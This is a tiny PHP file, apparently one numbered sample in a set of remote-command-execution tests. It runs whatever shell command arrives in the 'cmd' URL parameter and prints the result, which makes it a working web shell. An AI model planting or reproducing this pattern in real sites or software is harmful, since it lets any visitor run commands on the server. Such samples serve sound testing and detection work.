<?php
// RCE test variation #87
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>